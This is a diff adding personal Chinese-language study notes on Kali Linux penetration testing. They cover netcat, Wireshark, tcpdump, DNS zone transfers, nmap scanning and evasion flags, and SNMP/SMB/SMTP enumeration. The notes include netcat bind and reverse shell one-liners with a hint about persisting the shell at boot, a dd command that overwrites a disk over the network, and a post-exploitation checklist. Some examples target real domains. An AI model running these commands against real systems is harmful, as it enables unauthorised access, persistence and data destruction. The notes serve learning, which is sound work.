@@ -1,0 +1,626 @@
+map脚本位置/usr/share/nmap/scripts/
+nmap脚本名称目录/usr/share/nmap/scripts/script.db
+searchsploit-db位置/usr/share/exploitdb/exploits
+存放windows命令脚本的位置/usr/share/windows-binaries/
+exploit漏洞利用
+vuln弱点的缩写
+1.nc
+-l 侦听模式
+-p 端口
+对话
+服务端nc -lp port 
+客户端nc -nv ip port 
+
+传输⽂件
+A：nc -lp 333 > 1.mp4
+B：nc -nv 1.1.1.1 333 < 1.mp4 –q 1//-q stdin结束后time秒后退出
+或 
+A：nc -q 1 -lp 333 < a.mp4
+B： nc -nv 1.1.1.1 333 > 2.mp4
+
+打包文件夹 
+传送端 tar -cvf - file | nc -lp port -q 1  //代表tar解压到stdout
+接受端 nc -nv ip port | tar -xvf -
+或者 nc -nv ip port > file.tar - //-代表取之前的输出
+
+加密传文件
+//目前kali没有mcrypt命令
+传送端nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.txt
+接收端mcrypt --flush -Fbq -a rijndael-256 -m ecb < 1.txt
+
+流媒体服务
+传输端cat movie.mp4 | nc -lp 123
+接收端nc -nv ip port | 视频播放器
+
+端口扫描
+nc -nvz ip port  //tcp
+nc -nvzu ip port //udp端口
+
+远程硬盘复制　
+发送端:dd if=/dev/sda | nc -nv ip port -q 1
+接收端:nc -lp ip | dd of=/dev/sda
+
+正向shell
+连接端操控服务器
+nc -lp port -c bash
+或者nc -lp port -e /bin/bash  或者/bin/sh
+nc -nv ip port 
+反向shell//事先把shell文件写入到/etc/init.d启动时连接
+服务器操控连接端
+nc -lp port 
+nc -nv ip port -c bash //
+
+2.ncat
+//对于网络抓包学到wireshark在用
+ncat -l port --allow ip --ssl
+ncat -nv ip port --ssl
+ncat --allow 192.168.0.125
+
+3.wireshark
+linux--libpcap9 //抓包引擎
+windows--winpcap10 //抓包引擎
+混杂模式：抓取经过自己电脑的数据包
+
+过滤:
+
+抓包过滤
+src host 192.168.1.1 && dst port 80
+host 192.168.1.1 || host 192.168.1.2
+!broadcast
+ether src host 00:00:34:3f:00
+ether dst port 80
+
+显示过滤
+ip.addr == xx.xx.xx.xx
+ip.dst == xx.xx.xx.xx
+ip.src == xx.xx.xx.xx
+tcp.port
+tcp.srcport
+tcp.dstport
+not arp
+
+
+
+
+4.tcpdump:
+tcpdump -i eth0 -s 0 -w a.cap
+-i 指定监听物理接口
+-s 接收数据包大小0默认
+-w写入文件
+tcpdump -r a.cap
+读文件
+tcpdump -A -r a.cap 以ascii形式显示
+tcpdump -X -r a.cap 以16进制显示包内容
+tcpdump -i eth0 tcp port 22
+-n 不对ip进行名称解析
+tcpdump -n src host xx.xx.xx.xx -r a.cap
+
+
+5~12为被动信息收集
+缺点是不是最新的信息
+优点是不会被对方察觉
+
+5.nslookup
+DNS解析
+域名记录:
+A      用来创建IP地址的记录
+MX     对应smtp地址
+CNAME  记录也成别名记录，它允许你将多个记录映射到同一台计算机上
+TXT
+AAAA
+NS     记录是域名服务器记录
+
+设置类型set type/q=a,mx,cname,txt,ptr(反向),any
+nslookup -q=any sina.com 8.8.8.8
+
+6.dig
+dns信息收集，功能强与nslookup
+dig any baidu.com @8.8.8.8
+dig sina.com any 8.8.8.8
+dig +noall sina.com any
+dig +noall +answer sina.com any 只显示结果
+dig -x 22.22.22.22 反向查询
+dig +noall +answer sina.com ns  查出nameserver
+dig +noall +answer txt chaos VERSION.BIND @ns2.sina.com.cn //向ns2.sina.com.cn服务器查询
+dig +trace www.sina.com
+区域传输:
+获取所有的主机记录
+1)
+先dig sina.com ns
+后dig @ns2.sina.com sina.com axfr区域传输
+使用TCP
+2)
+host -T -l sina.com ns3.sina.com
+-T使用TCP
+-l使用axfr
+
+7.DNS主机爆破
+fierce 
+推荐dnsdict6但是没有
+
+dnsenum
+dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml
+-f 字典有默认
+-o保存文件
+可替代nslookup和dig
+
+dnsmap
+dnsrecon
+
+8.whois
+查询域名的所有信息
+whois sina.com
+
+9.tmux
+对命令行窗口分屏
+Ctrl+b %：划分左右两个窗格。
+Ctrl+b "：划分上下两个窗格。
+Ctrl+b <arrow key>：光标切换到其他窗格
+Ctrl+b x：关闭当前窗格。
+Ctrl+b+<arrow key>：按箭头方向调整窗格大小。
+Ctrl+b q：显示窗格编号。
+Ctrl+b t: 退出并显示时间q开启
+
+
+10.cupp
+自动生成字典
+firstname:xiaozijian
+Surname:
+Nickname:xjj
+
+
+11.exiftool
+获取图片的所有信息
+
+
+12.recon-ng
+web信息搜索,全特性的被动搜集框架
+recon-ng -w sina 使用工作区
+recon-ng -r 存储命令的文件
+help 命令提示
+没整因为最新版本的所有模块都需要自己装
+等待学习metasploit时再学习
+
+
+
+13~54主动信息收集(主机发现,端口扫描,服务扫描,操作系统识别,snmp,smb,smtp,防火墙识别,WAF识别)
+掌握跟多的工具为了应对肉鸡中纷繁复杂的工具安装情况
+/etc/network/interfaces修改eth0 dhcp
+dhclient eth0刷新
+
+13~24为主机发现
+_______________
+13~16为二层工具
+13.arping(slow)
+ arping 192.168.0.1 -c 1只发一个包
+ arping 192.168.0.1 -d 是否两个相同ip但是物理地址不同即arp欺骗
+ arping -c 192.168.0.1 -c 1 | grep "bytes from" | cut -d" " -f 5 | cut -d "(" -f 2 | cut -d")" -f 1 结合cut只要ip地址
+ shell 在kali里面
+
+
+14.namp(fast)
+ nmap -sn 192.168.0.1/24 
+ 或者
+ nmap -sn 192.168.0.1-254
+ nmap -iL arp.txt -sn
+
+
+15.netdiscover
+ 可以侦听混杂模式
+ netdiscover -p
+ netdiscover -i eth0 -r 192.168.1.1/24
+ -i是指定网卡
+ -r是指定ip地址的范围
+
+16.scapy (python包)(slow)
+ arp=ARP()
+ arp.display()
+ arp.pdst="192.168.0.1"
+ answer=sr1(arp)
+ answer.display()
+ 脚本在kali中
+ 使用from .. import .. 可以直接使用名字
+
+_______________
+17~21是三层发现
+17.ping(icmp)(slow)
+ ping 192.168.0.1 -c 5
+ ping -R www.baidu.com == traceroute
+ traceroute
+
+
+18.scapy(slow)
+ i=IP()
+ p=ICMP()
+ ping=(i/p)
+ ping[ip].dst="192.168.0.1"
+
+
+19.nmap(fast)
+ nmap 211.45.54.1 -sn
+ -sn代表不做端口扫描
+
+20.fping(fast)
+ 比ping多的功能
+ fping -g 1.1.1.1 1.2.2.2
+ fping -g 1.1.1.1/24
+ fping -g 1.1.1.1-200
+
+21.hping3(fast)(一般强大)
+ hping3 192.168.0.1 --icmp -c 1
+
+______________
+22~24是四层发现
+根据端口是否开启判断目标ip是否在线(而不是判断端口)
+Tcp可(不建立连接直接发ack等待对方回应RST则为在线，不回应不在线)
+tcp三次握手:
+syn=1在建立连接的阶段(未连接)
+ack：32bit的确认号，是接收数据方期望收到发送方的下一个报文段的序号(seq)，因此确认序号应当是上次已成功收到数据字节序号加1(seq+1)。
+flag.ACK:  ACK = 1时代表这是一个确认的TCP包，取值0则不是确认包
+udp只有对方端口没有开放才会返回信icmp端口不可达
+
+22.scapy
+a=sr1(IP(dst="192.168.0.1")/TCP(flags="A"), timeout=1)
+返回的TCP的flags为R则证明ip在线
+否则未返回或者被屏蔽掉了
+a=sr1(IP(dst="192.168.0.1")/UDP(dport="7345"))
+返回icmp目标ip不可达证明ip在线
+否则不在线或者被屏蔽掉了
+
+23.nmap
+nmap 211.168.0.0-254 -PU53 -sn
+nmap 211.168.0.0-254 -PA53 -sn
+-sn代表不做端口扫描只做主机发现
+扫描nat不好使
+nmap -iL ip.txt -PU53 -sn
+
+
+24.hping3
+hping3 --udp 192.168.0.1 -c 1
+
+____________
+25~33端口扫描
+UDP扫描
+已经open的主机
+给回包"icmp不可达",则没开放端口
+否则开放
+
+25.nmap
+nmap -sU 1.1.1.1
+默认1000个端口
+nmap -sU 1.1.1.1 -p53
+
+TCP扫描
+所有关于tcp的扫描都是基于三次握手的变化的
+
+基于连接的扫描
+ 只发syn
+ 日志不记录
+ 应用层不记录
+ 网络层有可能记录
+三次握手
+隐蔽扫描
+ 26.scapy
+    a=sr1(IP(dst="192.168.0.120")/TCP(flags="S",dport="80"))//syn包
+ 27.nmap
+    nmap 1.1.1.1 -p1-100   //默认使用-sS  syn隐蔽扫描
+    nmap -sS 1.1.1.1 -p1-100
+    nmap -sS 1.1.1.1 -p 20,21,53,80 --open //只显示开放端口
+    nmap -sS -iL iplist.txt -p 20,21,53,80 --open //只显示开放端口
+ 28.hping3
+    hping3 1.1.1.1 --scan 53,80,20,21 -S //-S表死syn包
+    hping3 -c 10 -S --spoof 192.168.0.11 -p ++1 192.168.0.122  //自己伪装成192.168.0.11 发送10个端口递增加一的syn包给191.168.0.122
+全连接扫描
+ 29.scapy
+ 发送一个S一个A但是期间有操作系统的RST
+ 所以关闭防火墙
+ iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.0.122 -j DROP
+ -A OUTPUT 处栈
+ -d目标地址
+ iptables -L -n --line-numbers
+ 以序号的形式显示已经添加的部分
+ iptables -D OUTPUT 2
+ 删除
+ 但是我的RST无法屏蔽，不知道为什么
+ 30.nmap
+ nmap -sT 192.168.0.122 -p1-100
+ 31.dmitry
+ dmitry -p 192.168.0.122
+ 31.nc
+ nc -nv -w 1 -z 192.168.0.122 1-100
+ -w ttl
+僵尸扫描
+ 不做了僵尸电脑太难找了
+ 我的windows不够闲，我也不会关闭搜有端口
+ 有时间再研究一下，因为太麻烦了
+ 32.scapy
+  i=IP()
+  t=TCP()
+  rz=(i/t)
+  rt=(i/t)
+  rz[IP].dst=IPz
+  rz[TCP].dport=445
+  rt[IP].src=IPz
+  rt[IP].dst=IPt
+  rt[TCP].dport=22
+  az1=sr1(rz) / at=sr1(rt) / az2=sr1(rz)
+  az1.display() / az2.display()
+  id增加2证明目标主机端口开放
+ 33.nmap
+  nmap -p445 192.168.0.118 --script=ipidseq.nse
+  找僵尸
+  我的nmap脚本不好使
+  nmap 192.168.0.122 -sI 192.168.0.118 -Pn -p 0-100
+  -sI给出僵尸机的ip
+  -Pn跳过主机发现
+
+____________
+34~40服务识别(应用层)
+识别开放端口运行的应用
+识别目标操作系统
+提高攻击效率
+ banner捕获(不是特别可靠)(并且不是特别容易抓取)
+  软件开发商
+  软件名称
+  服务类型
+  版本号
+   直接发现一只的漏洞和弱点
+  连接建立后直接获取banner
+  另类服务识别方法
+   特征行为和响应字段
+   不同的响应可用于底层操作系统
+  34.nc -nv 192.168.0.118 445
+  35.socket
+   Socket用于连接网络服务
+   python3
+   import socket
+   banner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   banner.connect(("192.168.0.118", 445))
+   banner.recv(4096)
+   banner.close()
+   exit()
+   . /ban_grab.py 192.168.1.134 1 100
+   目前还没发先谁的banner
+   36.nmap
+   nmap -sT 192.168.0.118 -p22 --script=banner.nse
+   37.amap
+   amap -B 192.168.0.118 135
+   amap -B 192.168.0.118 1-100 -q
+   -q让结果输出更美观
+ 服务识别
+   38.nmap(优秀)
+   nmap 192.168.0.118 -p 1-100 -sV
+   -sV通过特征识别端口运行服务(指纹?)
+ 操作系统识别
+   ___
+   主动扫描
+   ttl起始值:
+   windows:128(65-128)
+   linux/unix:64(1-64)
+   某些unix:255
+   39.nmap(good)
+   nmap 192.168.0.125 -O  多种方式识别
+   40.xprobe2(low)
+   xprobe2 192.168.0.125
+
+   ___
+   被动扫描
+   抓包或者arp欺骗查包总之不主动发给目标
+   41.p0f
+   抓包分析输出
+   结合arp欺骗
+ snmp分析(简单网络管理协议)(161端口)
+   42.onesixtyone
+     onesixtyone 192.168.0.126 public
+     onesixtyone -c dict.txt -i hosts.txt -o outfile -w 100
+   43.snmpwalk
+     snmpwalk 192.168.0.126 -c public -v 2c
+     -v 是版本
+     snmpwalk 192.168.0.126 -v 2c 192.168.0.126.1.3.6.1.4.1.77.1.2.25
+     查找具体mib
+   44.snmpcheck
+     snmpcheck -t 192.168.20.199
+     -t 可读性更强
+     snmpcheck -t 192.168.20.199 -c private -v 2
+     snmpcheck -t 192.168.20.199 -w
+     -w 检测是否有可写权限
+ smb(339,445端口)(发现漏洞)
+   45.nmap
+     nmap -v -p 139,445 192.168.0.126 --open
+     -v verbose
+     nmap -v -p 139,445 192.168.0.126 --script=smb-os-discovery.nse
+     smb-os-discovery.nse:计算机系统信息
+     nmap -v -p 139,445 192.168.0.126 --script=smb-check-vulns.nse --script-args=safe=1 
+     --script-args=unsafe=1:可以对目标进行破坏
+     但是我的显示没有smb-check-vulns.nse这个文件
+     去/usr/share/nmap/scripts找相关脚本
+   46.nbtscan
+     nbtscan -r 192.168.0.126/24
+     -r 最全
+     优势:可以跨网段(优于arp扫描)
+   47.enum4linux
+     enum4linux -a 192.168.0.126
+ smtp(发现邮件账号)
+   48.nmap
+     nmap smtp.163.com -p 25 --script=smtp-enum-user.nse --script-args=smtp-enum-user.methods=(VRFY)
+     nmap smtp.163.com -p 25 --script=smtp-open-relay.nse smtp-user-enum -M VRFY -U users.txt -t 地址
+     open-relay开放中继
+   49.脚本特别费劲，需要先helo还有登陆啥的
+ 防火墙识别
+   50.脚本
+   51.nmap
+     -sA 和默认(-sS)
+ 负载均衡
+   52.lbd
+     lbd www.baidu.com
+ WAF
+   53.wafwoof
+     wafwoof -l
+     wafw00f http://www.microsoft.com
+   54.nmap
+     nmap www.microsoft.com --script=http-waf-detect.nse
+
+
+nmap参数
+-iL <inputfilename>: Input from list of hosts/networks
+-iR <num hosts>: (随机扫描指定数量的主机)
+--exclude <host1[,host2][,host3],...>: Exclude hosts/networks(不包含内容主机或者网络)
+--excludefile <exclude_file>: 不包含文件中的内容
+HOST DISCOVERY:
+ -sL: (计算子网掩码)
+ -sn: (不扫描端口)
+ -Pn: (不放弃一些没回包的主机)
+ -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports(不知道干啥用的)
+ -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
+ -PO[protocol list]: (用ip进行ping)
+ -n/-R: (不做dns解析)
+ --dns-servers <serv1[,serv2],...>: (指定dns的ip)
+ --system-dns: Use OS's DNS resolver
+ --traceroute: (路由追踪)
+SCAN TECHNIQUES:
+ -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
+ -sU: UDP Scan
+ -sN/sF/sX: TCP Null, FIN, and Xmas scans
+ --scanflags <flags>: Customize TCP scan flags(自选flags包)
+ -sI <zombie host[:probeport]>: Idle scan
+ -sY/sZ: SCTP INIT/COOKIE-ECHO scans
+ -sO: IP protocol scan
+ -b <FTP relay host>: FTP bounce scan
+PORT SPECIFICATION AND SCAN ORDER:
+ -p <port ranges>: Only scan specified ports
+   Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
+ -F: Fast mode - Scan fewer ports than the default scan (不是默认的1000个端口，少一些)
+ -r: Scan ports consecutively - don't randomize (连续扫描)
+ --top-ports <number>: Scan <number> most common ports (只要前n个输出)
+ --port-ratio <ratio>: Scan ports more common than <ratio>
+SERVICE/VERSION DETECTION:
+ -sV: Probe open ports to determine service/version info (端口是什么服务)
+ --version-intensity <level>: Set from 0 (light) to 9 (try all probes) (扫描等级)
+ --version-light: Limit to most likely probes (intensity 2)
+ --version-all: Try every single probe (intensity 9)
+ --version-trace: Show detailed version scan activity (for debugging) (扫描过程跟踪)
+SCRIPT SCAN:
+ -sC: equivalent to --script=default
+ --script=<Lua scripts>: <Lua scripts> is a comma separated list of
+          directories, script-files or script-categories
+ --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
+ --script-args-file=filename: provide NSE script args in a file
+ --script-trace: Show all data sent and received
+ --script-updatedb: Update the script database. (升级更新脚本)
+ --script-help=<Lua scripts>: Show help about scripts. (帮助文档)
+          <Lua scripts> is a comma separted list of script-files or
+          script-categories.
+OS DETECTION:
+-O: Enable OS detection (操作系统的类型)
+--osscan-limit: Limit OS detection to promising targets
+--osscan-guess: Guess OS more aggressively
+TIMING AND PERFORMANCE:
+Options which take <time> are in seconds, or append 'ms' (milliseconds),
+'s' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
+-T<0-5>: Set timing template (higher is faster)
+--min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes (一组，最大扫多少)
+--min-parallelism/max-parallelism <numprobes>: Probe parallelization
+--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
+    probe round trip time.
+--max-retries <tries>: Caps number of port scan probe retransmissions.
+--host-timeout <time>: Give up on target after this long
+--scan-delay/--max-scan-delay <time>: Adjust delay between probes (每次探测延时，以防被目标发现)
+--min-rate <number>: Send packets no slower than <number> per second (每秒最少发包)
+--max-rate <number>: Send packets no faster than <number> per second (每秒最大发包)
+FIREWALL/IDS EVASION AND SPOOFING:
+-f; --mtu <val>: fragment packets (optionally w/given MTU)
+-D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys (伪造原地址,多地址用","分割产生噪声)
+-S <IP_Address>: Spoof source address (伪造原地址,用-e参数指定物理接口)
+-e <iface>: Use specified interface
+-g/--source-port <portnum>: Use given port number (指定原端口)
+--data-length <num>: Append random data to sent packets (每一个数据包增加随机数据)
+--ip-options <options>: Send packets with specified ip options
+--ttl <val>: Set IP time-to-live field
+--spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address (欺骗Mac地址)
+--badsum: Send packets with a bogus TCP/UDP/SCTP checksum (故意发送错误的checksum)
+OUTPUT:(输出格式)
+-oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
+   and Grepable format, respectively, to the given filename.
+-oA <basename>: Output in the three major formats at once
+-v: Increase verbosity level (use -vv or more for greater effect)
+-d: Increase debugging level (use -dd or more for greater effect)
+--reason: Display the reason a port is in a particular state
+--open: Only show open (or possibly open) ports
+--packet-trace: Show all packets sent and received
+--iflist: Print host interfaces and routes (for debugging)
+--log-errors: Log errors/warnings to the normal-format output file
+--append-outpu: Append to rather than clobber specified output files
+--resume <filename>: Resume an aborted scan
+--stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
+--webxml: Reference stylesheet from Nmap.Org for more portable XML
+--no-stylesheet: Prevent associating of XSL stylesheet w/XML output
+MISC:
+-6: Enable IPv6 scanning
+-A: Enable OS detection, version detection, script scanning, and traceroute
+--datadir <dirname>: Specify custom Nmap data file location
+--send-eth/--send-ip: Send using raw ethernet frames or IP packets
+--privileged: Assume that the user is fully privileged
+--unprivileged: Assume the user lacks raw socket privileges
+-V: Print version number
+-h: Print this help summary page.
+EXAMPLES:
+nmap -v -A scanme.nmap.org
+nmap -v -sn 192.168.0.0/16 10.0.0.0/8
+nmap -v -iR 10000 -Pn -p 80
+SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
+
+
+55.searchsploit
+搜索漏洞代码和攻击脚本 
+searchsploit php
+
+发现弱点
+cvss漏洞等级评分
+can发现漏洞报告给他制定cve的id
+cve漏洞编号
+oval漏洞描述语言使用xml
+scap安全框架
+ 56.nmap脚本
+  smb-vuln-ms10-061.nse 发现共享打印机
+  smb-enun-shares.nse  共享打印机没有发现后枚举的内容开了那些共享
+  或者其他vuln脚本
+
+ 57.openvas
+ openvasmd --user=admin --new-password=...
+
+
+
+
+ 58.nessus
+ /etc/init.d/nessusd start
+ 后访问https://www:8834/
+
+
+
+59.ulimit(定制kali，资源分配)
+-n 700000  同时打开文件最大数量
+
+
+___________________
+漏洞利用工具
+60.searchsploit
+60.exploit-db
+61.securityfocus
+
+入侵系统后
+上传工具
+提权
+擦除攻击痕迹
+安装后门
+ 长期控制
+ Dump 密码
+ 内网渗透
+
+
+62.upx
+压缩
+63.wine
+在linux中执行windows的中间件
+64.exe2bat.exe
+在/usr/share/windows-binaries/里
+用于将exe文件转换为bat文件
